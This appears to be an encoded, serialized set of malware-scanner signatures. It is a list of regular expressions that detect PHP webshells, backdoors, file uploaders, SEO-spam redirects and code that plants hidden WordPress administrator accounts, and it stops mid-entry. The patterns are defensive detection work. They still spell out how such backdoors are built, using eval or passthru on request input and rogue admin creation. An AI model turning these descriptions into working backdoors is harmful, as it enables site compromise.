tel8wLTldKylccyo9Lio_YmFzZTY=X2RlY29kZVwoKC4rP2V2YWxcKFwxXCkuK3xbXjtdK1s7XHNdKyhcJFthLXpfMC=5XSspXHMqPVteO1=rWztcc1=rKGZpbGVfcHV=X2NvbnRlbnRzXChcMy4rP1wxW147XStbO1xzXSt8ZWNob1tcKFxzXStbJyJdXFx4Lis_WyciXVtcKTtcc1=rKGluY2x1ZGV8dW5saW5rKVtcKFxzXStcM1tcKTtcc1=rKXszLH=uKylbXHNcfV=qL2kiO31zOjIxOiJpZiBpc3NldCBSRVFVRVNUIGV2YWwiO2E6Mjp7aTowO3M6NToiRzFIOFIiO2k6MTtzOjI3MjoiLygoXCRbX2EtejAtOV=rXHMqPVteO1=rO1xzKikqaWZbXHNcKF=raXNzZXRbXChcc1=rXCRfKFJFUVVFU3xHRXxQT1MpVFxbW15cXV=rXF1bXClcc1=rXHtccyooXCRbX1wuYS16MC=5XStbPVxzXStcJF8oUkVRVUVTfEdFfFBPUylUXFtbXlxdXStcXVs7XHNdKykrKChcJFtfYS16MC=5XStbPVxzXSspPyhldmFsfGZpbGVfcHV=X2NvbnRlbnRzfGZvcGVufGZ3cml=ZXxmY2xvc2UpXChbXlwpXStcKTtccyopKygoZWNob3xleGl=KVteXDtdKjtccyopKlx9XHMqKGVsc2UpPykrL2kiO31zOjM1OiJpZiBpc3NldCBiYXNlNjRfZGVjb2RlIFJFUVVFU1QgZXZhbCI7YToyOntpOjA7czo1OiJGNFNEViI7aToxO3M6MzA4OiIvPFw_W3BoXHNdKygoXEA_KGlnbm9yZV91c2VyX2Fib3J=fHNldF9=aW1lX2xpbWl=KVwofFwkW19cLmEtejAtOV=rXHMqPSlbXjtdK1s7XHNdKykqaWZbXChcc1whXSsoaXNzZXR8ZW1wdHkpW1woXHNdK1wkXyhSRVFVRVN8R=V8UE9TKVRcWy4rW1xzXHtdKyhcJFtfXC5hLXowLTldKylccyo9XHMqKGJhc2U2NF9kZWNvZGV8XCRbYS16XzAtOV=rKVxzKlwoK1xzKlwkXyhSRVFVRVN8R=V8UE9TKVRcW1teXF1dK1xdW1wpO1xzXStcQD9ldmFsXChcNlwpO1xzKlx9KFxzKmVsc2VbXHNce1=rZWNobyAiW14iXSpbIjtcc1x9XSspPygkfFw_PikvaSI7fXM6NTY6InNldF9=aW1lX2xpbWl=IHVubGluayBiYXNlNjRfZGVjb2RlIGZ3cml=ZSBleGVjIHBhc3N=aHJ1IjthOjI6e2k6MDtzOjU6IkU5UDczIjtpOjE7czo5OToiLzxcPyhwaHApPy4rP3NldF9=aW1lX2xpbWl=XCgwXCkuKz91bmxpbmtcKC4rP2Jhc2U2NF9kZWNvZGVcKC4rP2Z3cml=ZVwoLis_ZXhlY1woLis_cGFzc3RocnVcKC4rL2lzIjt9czozNDoibW92ZV91cGxvYWRlZF9maWxlIF9GSUxFUyBfX=ZJTEVfXyI7YToyOntpOjA7czo1OiJIMThHZiI7aToxO3M6MjYwOiIvPFw_W3BoXHNdKygoXCRbYS16XzAtOV=rKVxzKj1ccypcJF9GSUxFU1xbW147XSs7XHMqKFwkW2Etel8wLTldKylccyo9W147XSs7XHMqaWZbXHNcKF=rZmlsZV9leGlzdHNbXHNcKCciXC5cL1=rXDNbXHNcKCciXClcc1=rdW5saW5rW1xzXCgnIlwuXC8pXStcMyk_Lio_KG1vdmVfdXBsb2FkZWRfZmlsZVtcc1woXSsoXCRfRklMRVNcW1teLF=rWyxcc1=rX19GSUxFX198XDIpfHN5c3RlbVwoWyciXW12IFsnIl1cLlwkX=ZJTEVTXFspLio_KCR8XD8-KS9pcyI7fXM6NTg6InBocCBpZiBpc3NldCBSRVFVRVNUIGV2YWwgZmlsZV9wdXRfY29udGVudHMgaW5jbHVkZSB1bmxpbmsiO2E6Mjp7aTowO3M6NToiSDJPSFEiO2k6MTtzOjQ3NzoiLzxcP1twaFxzXSsoXEA_KGlnbm9yZV91c2VyX2Fib3J=fHNldF9=aW1lX2xpbWl=fGVycm9yX3JlcG9ydGluZylcKC4qP1wpO1xzKikqKFwkW2Etel8wLTldK1xzKj=uKz87XHMqKSoodHJ5XHMqfGlmW1xzXChcIV=rKGVtcHR5fHN=cmxlbnxpc3NldClcKFwkXyhSRVFVRVN8R=V8UE9TKVRbXlx7XSspXHsuKj8oXCRbYS16XzAtOV=rKVxzKj=uKz8oYyh1KXJsX1teXCldK3woZSl2YWxcKClcN1wpLis_ZmlsZV8uKFw5fFwxMCl=X2NvbnRlbnRzW1woIF=rKFtcJGEtel8wLTlcWyciXF1cLl=rKS4rPyhlY2hvW1xzXChdK1wxMnxpbmNsdWRlKF9vbmNlKT9bXChcc1=rXDEyLis_dW5saW5rW1woXHNdK1wxMnxjdXJsX2luaXRcKC4rP2N1cmxfc2V=b3B=XChbXixdKyxccypDVVJMT1BUX1VSTFssXHNdK1wxMnxcfVxzKmNhdGNoXHMqXChccypFeGNlcHRpb25ccypcJFthLXpfMC=5XStbXClcc1=qXHtbXlx9XSpcfVxzKikuKj8oXD8-fCQpL2lzIjt9czo=MzoicGhwIGNoZGlyIFJFUVVFU1QgZ2V=Y3dkIG1vdmVfdXBsb2FkZWRfZmlsZSI7YToyOntpOjA7czo1OiJIMzJDcyI7aToxO3M6MjY5OiIvPFw_Ki4rPyhjaGRpcltcKFxzXStcJF8oUkVRVUVTfFBPU3xHRSlUXFt8ZXJyb3JfcmVwb3J=aW5nW1woXHNdKzAuKz9bZ3NdZXRfKHRpbWVfbGltaXRbXChcc1=rMHxtYWdpY19xdW9=ZXMuKz9oYWNrZVtyZF=pKS4rPyhcJFthLXpfMC=5XSspWz1cc1xAXStnZXRjd2RbXHNcKF=rLis_KGNvcHl8bW92ZV91cGxvYWRlZF9maWxlKVtcc1woXSsoLis_dW5saW5rW1xzXChdKy4rP3NjYW5kaXJbXHNcKF=rXDR8XCRfRklMRVNcW1teLF=rWyxcc1=rXDMpLis_KFw_PnwkKS9pcyI7fXM6Mzc6InBocCBjcmVhdGVfZnVuY3Rpb24gVmFyaWFibGUgZnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiSDFIQVoiO2k6MTtzOjIzNjoiLzxcP1twaFxzXSooXC9cKihbXlwqXSpcKlteXC9dKSpbXlwqXSpcKlwvXHMqfFwvXC8uKlxzKikqKChcJFthLXpfXC=wLTldKylccyo9Lis7XHMqfGlmXHMqXChbXlx7XStce1xzKikrKChcJFthLXpfXC=wLTldKylccyo9XHMqKT9jcmVhdGVfZnVuY3Rpb25cKFteLF=rLFxzKihcNFteO1=rO1tcc1xAXSpcNlwofCIoXFwoWzAtOV17MiwzfXx4WzAtOWEtZl17Mn=pKSsiKVteXCldKltcKTtcc1x9XSsoJHxcPz4pL2kiO31zOjQ4OiJwaHAgYXJyYXkgZm9yZWFjaCBhcnJheSBldmFsIEFycmF5IEZ1bmN=aW9uIFBPU1QiO2E6Mjp7aTowO3M6NToiRUFVTnAiO2k6MTtzOjEyMToiLzxcP1twaF=qXHMrKFwkW2EtelwtXF8wLTldKylbPVxzXSthcnJheVwoW147XSs7XHMqZm9yZWFjaFtcc1woXStcMS4rP2V2YWxbXHNcKF=rXDFcW1teXF1dK1xdK1tcKFxzXStcJF9QT1NUXFtcMS4rP1w_Pi9pcyI7fXM6Nzc6ImZ3cml=ZSB1bmxpbmsgZXZhbCBjaG1vZCBQT1NUIHBocGluZm8gbW92ZV91cGxvYWRlZF9maWxlIGV4ZWMgc3lzdGVtIHBhc3N=aHJ1IjthOjI6e2k6MDtzOjU6IkVCN=V=IjtpOjE7czoxNTM6Ii88XD8uKz9lcnJvcl9yZXBvcnRpbmdcKDBcKS4rP2Z3cml=ZVwoLis_dW5saW5rXCguKz9ldmFsXCguKz9jaG1vZFwoXCRfUE9TVFxbLis_cGhwaW5mb1woLis_bW92ZV91cGxvYWRlZF9maWxlXCgoLis_KGV4ZWNcKHxzeXN=ZW1cKHxwYXNzdGhydVwoKSl7M3=uKy9pcyI7fXM6Mjk6InBvc3Qgc3RydG91cHBlciBpZiBpc3NldCBldmFsIjthOjI6e2k6MDtzOjU6IkZCM=JlIjtpOjE7czoxODc6Ii8oKFwkW2Etel8wLTldKylccyo9W147XSs7XHMqKSsoXCRbX2EtejAtOV=rXHMqPVxzKihcJFthLXpfMC=5XSt8c3RydG8uLi5lcilccypcKChbXHNcLl=qXCRbYS16XzAtOV=rXHMqXFtcZCtcXSkrW1wpO1xzXSspK2lmW1woXHNdK2lzc2V=XHMqXChbXlwpXStbXClcc1=rXHtccypldmFsXHMqXChbXlwpXStbXCk7XHNdK1x9L2kiO31zOjM=OiJpZiBpc3NldCBSRVFVRVNUIFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc5Uk5vIjtpOjE7czoyNDQ6Ii9pZltcc1woXCFdKyhpc3NldHxlbXB=eSlbXHNcKF=rXCRfKFJFUVVFU1R8R=VUfFBPU1R8Q=9PS=lFKS4rW1x7XHNdKihcJFthLXpfMC=5XHtcfV=rXHMqPVxzKignW14nXSonfCJbXiJdKiJ8XCQpW147XSpbJyI7XClcc1=qKSooXCRbYS16XzAtOV=rXHMqPVxzKik_XEA_KFwkKD8hZGVsZXRlX3NlcnZpY2UpW2Etel8wLTldKykoXHMqXFtbXlxdXSpcXSkqcypcKC4qP1tcKV=rO1tcfVxzXSooZWxzZVxzKlx7W159XStcfSk_L2kiO31zOjY1OiJpZiBhcnJheV9rZXlzIEdFVCBmaWxlX2dldF9jb25=ZW5=cyBpZiB1bmxpbmsgZm9wZW4gZndyaXRlIGZjbG9zZSI7YToyOntpOjA7czo1OiJHNkJDMCI7aToxO3M6MjkzOiIvKFxAPyhpZ25vcmVfdXNlcl9hYm9ydHxpbmlfc2V=fHNldF9=aW1lX2xpbWl=fGVycm9yX3JlcG9ydGluZylcKC4qP1wpO1xzKnxcJFthLXpfMC=5XStccyo9W147XSs7XHMqKSooKChpZlxzKlwofGVsc2UpW15ce1=qXHtccyopP2Z1bmN=aW9uXHMrLis_cmV=dXJuW147XSo7W1xzXH1dKykrKChcJFthLXpfMC=5XStccyo9XHMqKT9cJFthLXpfMC=5XStcKFteO1=rWyInXCk7XH1cc1=qKSsuKz8oZihvcGVufHdyaXRlfGNsb3NlKVwoLis_KXszLH1pbmNsdWRlXCguKj9cKTtccyp1bmxpbmtcKC4qP1wpO1xzKi9pcyI7fXM6NDE6ImlmIGFycmF5X2tleXMgR=VUIGV2YWwgYmFzZTY=X2RlY29kZSBleGl=IjthOjI6e2k6MDtzOjU6IkVDRkZGIjtpOjE7czoyMTk6Ii88XD9bcGhcc1=qKFxAP2Vycm9yX3JlcG9ydGluZ1woMFwpO1xzKik_aWZbXChcc1=rYXJyYXlfa2V5c1woXCRfR=VULitccysoKDxcP1twaFxzXSopP1wkW2EtelxfMC=5XStbXHNce1wkXStcQD9ldmFsXChiYXNlNjRfZGVjb2RlXChbJyJdW2EtelxfXC9cK1w9MC=5XStbJyJdW1wpXH1ce1wkXHNdK2V4aXRcKFtcKVx9XHNdK1wmXHMqXCRbYS16XF8wLTldK1s7XHNcfV=rXD8-KSsvaSI7fXM6Mzk6ImJhc2U2NF9kZWNvZGUgZnVuY3Rpb24gY3VybCByZXR1cm4gZXhpdCI7YToyOntpOjA7czo1OiJFQ=ZKViI7aToxO3M6MTk4OiIvPFw_W3BoXHNdKihcL1wqLis_XCpcL1xzKikqKFwkW2EtelxfMC=5XStccyo9XHMqYmFzZTY=X2RlY29kZVwoW147XStbXCk7XHNdKikrZnVuY3Rpb25ccysoW2EtelxfMC=5XSspXHMqXChbXlx7XStbXHtcc1=rKChcJFthLXpcXzAtOV=rW1xzKj1dKyk_Y3VybF9bXjtdKztccyopK3JldHVybiAuK1wzXCguK2V4aXQ7W1x9XHNdKygkfFw_PikvaXMiO31zOjQwOiJwaHAgaWYgaXNzZXQgR=VUIGVjaG8gaWYgUE9TVCBjb3B5IEZJTEVTIjthOjI6e2k6MDtzOjU6IkczSUNMIjtpOjE7czo1OTI6Ii88XD9bcGhcc1=qKGVjaG9bXjtdKjtccyp8ZXJyb3JfcmVwb3J=aW5nXCgwXCk7XHMqfFwvXCouKj9cKlwvXHMqKFwkW2Etel8wLTldK1xzKj1bXjtdKztccyp8XC9cL1teXG5dKlxzKikrKGlmW1xzXChdK2lzc2V=XChcJF8oUkVRVUVTfEdFfFBPUylUXFtbXlxdXStcXSlbXlwpXSpbXClcc1x7XSsoXCRbYS16XzAtOV=rXHMqPVxzKlwkX1thLXpfMC=5XStcW1teXF1dK1xdO1xzKikrKFwkW2Etel8wLTldK1xzKj1ccypcJFthLXpfMC=5XStcKFteXCldK1wpKztccyopKy4qP1wzW15ce1=rW15cfV=rXH1ccyooXD8-XHMqPFw_W3BoXHNdKik_KSppZltcc1woXStpc3NldFwoXCRfKFJFUVVFU3xHRXxQT1MpVFteXCldK1tcKVxzXHtdKygoZWNob3xwcmludHxcJFthLXpcXzAtOV=rXHMqPSlbXjtdKztccyopK2lmW1xzXChdK1wkXyhSRVFVRVN8R=V8UE9TKVRbXlwpXStbXClcc1x7XStpZltcc1woXStcQD9jb3B5XCgoW1xzXCxdKlwkX=ZJTEVTKFxbW15cXV=rXF=pKykrW1wpXHNdK1x7W15cfV=rKFtcfVxzXSsoZWxzZVtcc1x7XStbXlx9XSspPykrKFw_PlxzKig8KHRpdGxlPmhhY2tlZC5ieVteXG5dKnxcL1thLXpdKz4pXHMqKSp8JCkvaXMiO31zOjUxOiJpZiBpc3NldCBGSUxFU3xSRVFVRVNUIG1vdmVfdXBsb2FkZWRfZmlsZSBlbHNlIGVjaG8iO2E6Mjp7aTowO3M6NToiRjJSQmwiO2k6MTtzOjUwOToiLzxcP1twaFxzXSsoKFwkW2EtelxfMC=5XStccyo9fHNldF9=aW1lX2xpbWl=XCh8aW5pX3NldFwoKVteO1=rWztcc1=rKSooKFthLXpcXzAtOV=rKVwoW147XStbO1xzXH1dKyk_KGlmW1woXHNdK3N1YnN=cltcKFxzXStbXlx7XStbXHNce1=rKFwkW2EtelxfMC=5XStccyo9W147XStbO1xzXH1dKykrKT8oaWZbXChcc1=rKGlzc2V=W1woXHNdKyk_XCRfKEZJTEVTfFJFUVVFU1R8UE9TVHxHRVQpW15cKV=qW1wpXHNce1=rKFwkW2Etel8wLTldK1xzKj1bXjtdKztccyopKikrKFxAfGlmW1woXHNdKykqbW92ZV91cGxvYWRlZF9maWxlXChbXjtdKyhbO1xzXH1dKyhlbHNlW1x7XHNdK3woZWNob3xleGl=KVteO1=qWztcc1x9XSspKikrKGZ1bmN=aW9uXHMrXDRcKFteO1=rWztcc1x9XSsoXCRbYS16XF8wLTldK1xzKj1bXjtdK1s7XHNcfV=rKSppZltcKFxzXStbXlx7XStbXHNce1=rKFxAfGlmW1woXHNdKykqbWtkaXJcKFteO1=rWztcc1x9XStyZXR1cm5bXjtdK1s7XHNcfV=rKT8oXD8-fCQpL2kiO31zOjUzOiJleGVjIHN5c3RlbSBwYXNzdGhydSBmd3JpdGUgVmFyaWFibGUgRnVuY3Rpb24gUkVRVUVTVCI7YToyOntpOjA7czo1OiJGN1BNUiI7aToxO3M6MjE2OiIvPFw_W3BoXHNdKygoXCRbYS16XzAtOV=rKVxzKj1ccyooW2Etel8wLTldK1woXHMqKVwkXyhSRVFVRVN8R=V8UE9TKVRcWy4qKHBhc3N=aHJ1fGV4ZWN8c3lzdGVtfFwkW2Etel8wLTldKylcKFtccyJdKlwyfC4rP2V4ZWNcKC4rP3N5c3RlbVwoLis_cGFzc3RocnVcKC4rP2Z3cml=ZVwoLis_XEA_XCRbYS16XzAtOV=rXChcJF8oUkVRVUVTfEdFfFBPUylUKS4rPygkfFw_PikvaXMiO31zOjU1OiJwaHAgVmFycyBBcnJheSBiYXNlNjRfZGVjb2RlIGZ1bmN=aW9uIFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc1RDZTIjtpOjE7czoyNzU6Ii8oXCRbYS16XzAtOV=rXHMqPVteO1=rWztcc1=rKSooXCRbXCRce1=qW2Etel8wLTldK1x9KihccypcW1teXF1dK1xdfFxzKlx7W15cfV=rXH=pKilccyo9XHMqYXJyYXlbXChcc1=rYmFzZTY=X2RlY29kZVwoLis_ZnVuY3Rpb24gKFthLXpfMC=5XSspXHMqXCguKz9cMlxzKihcW1teXF1dK1xdXHMqKSpcKC4rKFwkW1wkXHtdKlthLXpfMC=5XStcfSooXHMqXFtbXlxdXStcXXxccypce1teXH1dK1x9KSopXHMqPVw=XCguKz8oZWNob3xkaWV8cHJpbnQpW1xzXChdKlw2W147XSo7L2lzIjt9czozNjoiaWYgcmVuYW1lIG9yIGZpbGVfcHV=X2NvbnRlbnRzIHRvdWNoIjthOjI6e2k6MDtzOjU6IkYyTkU2IjtpOjE7czo5MToiLzxcPy4rP2NvcHlcKF9fRklMRV9fLC4rP2ZpbGVfcHV=X2NvbnRlbnRzXCguKz91bmxpbmtcKC4rP2hlYWRlclwoIkxvY2F=aW9uOiBodHRwOlwvXC8uKy9pcyI7fXM6MzM6Imh=bWwgaGVhZCB1bnppcCBGSUxFUyB1bmxpbmsgZm9ybSI7YToyOntpOjA7czo1OiJHMlFDQiI7aToxO3M6MjMwOiIvXjxodG1sPlxzKjxoZWFkPi4rPyhmaWxlcGVybXNccypcKC4rPyhwb3NpeF9nZXRbcHd1Z3JdK2lkXHMqXCguKz8pezIsfW1vdmVfdXBsb2FkZWRfZmlsZVxzKlwoLis_ZnB1dHNccypcKC4rP3VubGlua1xzKlwoLis_ZXhlY1xzKlwoLis_XHMqcmVhZGRpclwoLis_XD98dW56aXBcKFwkX=ZJTEVTXFsuKz91bmxpbmtcKFwkLitcPz5ccyo8XC9mb3JtKT5ccyo8XC9ib2R5PlxzKjxcL2h=bWw-XHMqJC9pcyI7fXM6ODk6ImN1cmxfaW5pdCBoZWFkZXIgTG9jYXRpb24gcmV=dXJuIHByZWdfcmVwbGFjZV9jYWxsYmFjayBjcmVhdGVfZnVuY3Rpb24gcmV=dXJuIFJFTU9URV9BRERSIjthOjI6e2k6MDtzOjU6IkVDVDJlIjtpOjE7czoxNDY6Ii88XD8uKz9jdXJsX2luaXRcKC4rP2hlYWRlcltcKCInXHNdK=xvY2F=aW9uOi4rP3JldHVybiBwcmVnX3JlcGxhY2VfY2FsbGJhY2tcKC4rP2NyZWF=ZV9mdW5jdGlvblwoLis_cmV=dXJuIFwkX1NFUlZFUlxbWyInXVJFTU9URV9BRERSLisoXD8-fCQpL2lzIjt9czo4MToicGhwIGJhc2U2NF9kZWNvZGUgZmlsZV9wdXRfY29udGVudHMgdW5saW5rIGZ1bmN=aW9uX2V4aXN=cyBIZXggY2FsbF91c2VyX2Z1bmMgSGV4IjthOjI6e2k6MDtzOjU6IkYxNjBxIjtpOjE7czozNTY6Ii88XD9bcGhcc1=rKFwkXHtbXlx9XStbXH1cc1=rKFxbW15cXV=rW1xdXHNcfV=rKSo9W147XStbO1xzXSsoXEA_KFwkW2Etel8wLTldK1xzKj18ZGVmaW5lXCh8c2Vzc2lvbl9zdGFydFwofGVycm9yX3JlcG9ydGluZ1wofGluaV9zZXRcKHxzZXRfdGltZV9saW1pdFwofHNldF9tYWdpY19xdW9=ZXNfcnVudGltZVwoKVteO1=rWztcc1=rfGlmXChbXlx7XStbXHtcc1=rW15cfV=rW1x9XHNdKykqKSsoW147XStbO1xzXSspPy4rZmlsZV9wdXRfY29udGVudHNcKC4rP2Jhc2U2NF9kZWNvZGVcKC4rP3VubGlua1woLis_ZnVuY3Rpb25fZXhpc3RzXChbJyJdXFx4Lis_Y2FsbF91c2VyX2Z1bmNcKFsnIl1cXHguKz8oJHxcPz4pL2lzIjt9czo1MzoicGhwIGZ1bmN=aW9uIGZpbGVfZ2V=X2NvbnRlbnRzIGZ3cml=ZSB1bmxpbmsgX19GSUxFX18iO2E6Mjp7aTowO3M6NToiRzQ2S=siO2k6MTtzOjE1NDoiLzxcP1twaFxzXSsoXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqZnVuY3Rpb24gKFthLXpfMC=5XSspXCguK2ZpbGVfZ2V=X2NvbnRlbnRzXCguK2ZvcGVuXCguK2Z3cml=ZVwoLitmY2xvc2VcKC4rXDJcKC4rdW5saW5rXChfX=ZJTEVfX1wpO1xzKigkfFw_PlxzKikvaSI7fXM6NTU6Imh=bWwgYm9keSBwaHAgb3BlbmRpciByZWFkZGlyICFmaWxlX2V4aXN=cyBmb3BlbiBmd3JpdGUiO2E6Mjp7aTowO3M6NToiRjJESlYiO2k6MTtzOjIyMToiLyg8KFwhfFwvKT8oZG9jdHlwZXxodG1sfGhlYWR8bWV=YXx=aXRsZXxib2R5KVtePl=qPlthLXpfMC=5XHNdKil7Mix9PFw_W3BoXHNdK1wkW2EtelxfMC=5XStccyo9XHMqJzxcP1twaFxzXSsuKz9vcGVuZGlyXCguKz9yZWFkZGlyXCguKz8oXCFmaWxlX2V4aXN=c1woLis_Zm9wZW5cKC4rP2Z3cml=ZVwoLis_KXszLH1cPz5ccyooPFwvKGh=bWx8Ym9keSlbXj5dKj5ccyopezIsfSQvaXMiO31zOjY4OiJwaHAgZnVuY3Rpb24gZGllIHNldGNvb2tpZSBpZiBlbXB=eSBpZiBpc3NldCBmb3JtIG1vdmVfdXBsb2FkZWRfZmlsZSI7YToyOntpOjA7czo1OiJHOTJKdyI7aToxO3M6NjAxOiIvPFw_W3BoXHNdKygoXCRbYS16XzAtOV=rKVxzKj1bXjtdKztccyopKihpZltcKFxzXSsoXDJ8XCFlbXB=eVtcKFxzXSspW15ce1=rXHtccyooKCgoXCRbYS16XzAtOV=rKVxzKj1ccyopPyhcMlwoLio_XCkrfFwkXyhSRVFVRVN8R=V8UE9TKVRbXjtdKyk7XHMqfGlmW1woXHNcIV=rKGlzc2V=W1woXHNdKy4rP1wpK1xzK1thLXpfMC=5XSt8XDhbXlx9XSopKSkrW1x9XHNdKnxmdW5jdGlvbiBbYS16XzAtOV=rXChbXlx7XStce1xzKihkaWVcKC4rP1wpO1xzKnwoXCRfQ=9PS=lFLis_O1xzKnxzZXRjb29raWVcKC4rP1wpO1xzKil7Mn=pXH1ccyopKyhbXHNce1=qKFwkW2Etel8wLTldKylccyo9XHMqXCRfKFJFUVVFU1R8R=VUfFBPU1R8RklMRSlbXjtdKztbXHNcfV=qKSooXD8-XHMqfGVjaG9bXHNcKF=qKFsnIl=pKSg8KGZvcm18aW5wdXQpW14-XSo-W2Etelw6MC=5XHNdKikrPFwvZm9ybT4oXHMqPFw_W3BoXHNdK3xbJyJdO1xzKikoXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnxpZltcc1woXSspKihtb3ZlX3VwbG9hZGVkX2ZpbGVcKFteXDtdK3woXCRbYS16XzAtOV=rKVxzKj1ccypcJFthLXpfMC=5XStccypcKC4qP1wpKTtbXHNcfV=qKCR8XD8-KS9pIjt9czoxMjk6InBocCBzZXRfdGltZV9saW1pdCBpbmlfc2V=IGVycm9yX3JlcG9ydGluZyBpZiBhcnJheV9rZXlfZXhpc3RzIEhUVFBfVVNFUl9BR=VOVCBzZWFyY2gtdHJhY2tlci5jb2=gcHJlZ19tYXRjaCBnb29nbGUgYmluZyBvYl9zdGFydCI7YToyOntpOjA7czo1OiJGM=pLaCI7aToxO3M6MjMwOiIvPFw_W3BoXHNdKy4qP3NldF9=aW1lX2xpbWl=XCguKz9pbmlfc2V=XCguKz9lcnJvcl9yZXBvcnRpbmdcKC4rP2lmW1woXCFcc1=rYXJyYXlfa2V5X2V4aXN=c1woWyInXUhUVFBfVVNFUl9BR=VOVC4rP2h=dHA6XC9cL3NlYXJjaC1=cmFja2VyXC5jb21cL2luXC5jZ2lcPy4rPyhwcmVnX21hdGNoXChbIiddXC8oW15cL1=qZ29vZ2xlfFteXC9dKmJpbmcpezJ9Lis_KXsyfS4rP29iX3N=YXJ=XCguKy9pcyI7fXM6NzI6ImJhc2U2NF9kZWNvZGUgZmlsZV9wdXRfY29udGVudHMgY2htb2QgdG91Y2ggZnNvY2tvcGVuIGN1cmxfZXhlYyBvYl9zdGFydCI7YToyOntpOjA7czo1OiJGQkdCWSI7aToxO3M6MTk1OiIvXC9cL1xzKmlzdGFydC4rPyhcJFthLXpfMC=5XSspW1xzKlwuPV=rYmFzZTY=X2RlY29kZVwoLis_ZmlsZV9wdXRfY29udGVudHNcKFteLF=rLFxzKlwxLis_Y2htb2RcKC4rP3RvdWNoXCguKz8oZnNvY2tvcGVuXCguKz9mZ2V=c1wofGN1cmxfaW5pdFwoLis_Y3VybF9leGVjXCgpLis_b2Jfc3RhcnRcKC4rP1wvXC9pZW5kW15cblw_XSovaXMiO31zOjEwNToicGhwIGVycm9yX3JlcG9ydGluZyBpbmlfc2V=IHNldF9=aW1lX2xpbWl=IGlmIGlzc2V=IFJFUVVFU1QgZmlsZV9nZXRfY29udGVudHMgZmlsZV9wdXRfY29udGVudHMgdW5saW5rIGllIjthOjI6e2k6MDtzOjU6IkgyREo4IjtpOjE7czo=OTg6Ii88XD9bcGhcc1=rKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyp8XC9cL1teXG5dKlxzKykqKGlnbm9yZV91c2VyX2Fib3J=XHMqXChbXjtdKjtccyp8XCRbYS16XzAtOV=rXHMqPVteO1=qWztcc1=rKSsoKGVsc2VbXHNce1=qfGlmW1xzXChdK1teO1=rfFwkW2Etel8wLTldK1xzKj1ccyopKihlcnJvcl9yZXBvcnRpbmd8aW5pX3NldHx8c2V=X3RpbWVfbGltaXR8d2hpbGUoPz1cKDFcKSkpXHMqXChbXjtdKztbXH1cc1=rKSsoKGlmW1xzXChdKyhpc193cml=YWJsZXxpc3NldHxmaWxlX2V4aXN=cylbXHNcKF=rXCQoX1JFUVVFU1R8X=dFVHxfUE9TVHxwYXRoKVteO1=rKT8oXEA_KGZpbGVfZ2V=X2NvbnRlbnRzfGZpbGVfcHV=X2NvbnRlbnRzfHVubGlua3xjaG1vZClccypcKFteO1=rOyhbXH1cc1=qKGlmW1xzXChdK1teXCldK1wpK3xlbHNlKT9bXHtcc1=qKGRpZXxwcmludHxzbGVlcHxlY2hvKVteO1=qOykqW1x9XHNdKikrW1x9XHNdKyl7Myx9Lio_KCR8XD8-KS9pcyI7fXM6NjY6InBocCBpZiBmdW5jdGlvbl9leGlzdHMgZmlsZV9wdXRfY29udGVudHMgZm9wZW4gY2htb2Qgc3lzdGVtIHVubGluayI7YToyOntpOjA7czo1OiJGQk5LTyI7aToxO3M6MTY5OiIvPFw_KC4rPyh=b3VjaHxoZWFkZXIpXCgpKy4rP2lmW1xzXChcIV=rZnVuY3Rpb25fZXhpc3RzXChbXHMnIl=rKGZpbGVfcHV=X2NvbnRlbnRzKVsiJ1xzXClce1=rZnVuY3Rpb25ccytcM1woLis_Zm9wZW5cKC4rP1wzXCguKz9jaG1vZFwoLis_c3lzdGVtXCguKyh1bmxpbmt8ZXhpdClcKC4rL2lzIjt9czoyNjoicGhwIGVjaG8gcGFzc3RocnUgX1JFUVVFU1QiO2E6Mjp7aTowO3M6NToiRkJOS=IiO2k6MTtzOjE1NjoiLzxcP1twaFxzXSsoKGVjaG98cHJpbnQpW1xzXChdKyhbJyJdKS4qP1wzW1wpXHNdKjtccyopKigoXCRbYS16XzAtOV=rKVxzKj1ccyopP1xAPyhwYXNzdGhydXxleGVjfHN5c3RlbXxcJFthLXpfMC=5XSspXHMqXChcJF8oUkVRVUVTfEdFfFBPUylULis7XHMqKCR8XD8-KS9pIjt9czo2OToicmVxdWlyZV9vbmNlIHdwLWNvbmZpZyBpbmlfc2V=IG15c3FsX3F1ZXJ5IFVQREFURSB1c2VycyBTRVQgdXNlcl9wYXNzIjthOjI6e2k6MDtzOjU6IkZDVktwIjtpOjE7czoxOTE6Ii9eLio8XD9bcGhcc1=qKGluY2x1ZGV8cmVxdWlyZSkoX29uY2UpP1woLit3cC1jb25maWdcLnBocFsiJ1xzXCk7XSsoXEA_aW5pX3NldFwoW15cKV=rW1wpO1xzXSspKy4rPyhteXNxbF9xdWVyeVwoWyciXVVQREFURVtcc1x7JyIuXStcJHRhYmxlX3ByZWZpeFtcc1x9JyIuXSt1c2Vyc1xzK1NFVFxzK3VzZXJfcGFzcy4rKXsyLH=kL2lzIjt9czoxMTA6InBocCBpZiBSRVFVRVNUIGFkZF9hY3Rpb24gZnVuY3Rpb24gZ2xvYmFsIGlmIGdldF9vcHRpb24gcmV=dXJuIG9iX3N=YXJ=IHdwX3Jld3JpdGUtPmZsdXNoX3J1bGVzIHdwX2NhY2hlX2ZsdXNoIjthOjI6e2k6MDtzOjU6IkgxOURCIjtpOjE7czo1NDk6Ii88XD9bcGhcc1=rKD86aWZccypcKFteXCldKlwkXyhQT1N8UkVRVUVTfEdFKVRbXlx7XStbXHtcc1=rKCl8YWRkX2FjdGlvblxzKlwoW14sXSssXHMqKFsnIl=pKFthLXpfMC=5XSspWyciXCk7XHNcfV=rKCl8ZnVuY3Rpb25ccytcNFteXHtdK1tce1xzXSsoKSl7M31cMlw1XDYoKChpbmNsdWRlfHJlcXVpcmUpKF9vbmNlKT9cKFteO1=rO1xzKnxpZltcc1woXCFdK3VzZXJuYW1lX2V4aXN=c1woW15ce1=rW1x7XHNdKykqKFwkW2Etel8wLTldKylccyo9XHMqd3BfY3JlYXRlX3VzZXJcKFteO1=rO1xzKihcJFthLXpfMC=5XSspXHMqPVxzKm5ld1xzK1dQX1VzZXJbXChcc1=rXDExW1wpO1xzXStcMTJbXHNcLT5dK3NldF9yb2xlW1woXHMnIl=rYWRtaW5pc3RyYXRvcnwoZ2xvYmFsW147XSo7XHMqKT9pZltcc1woXCFdK2dldF9vcHRpb25cKFteXCldK1tcKV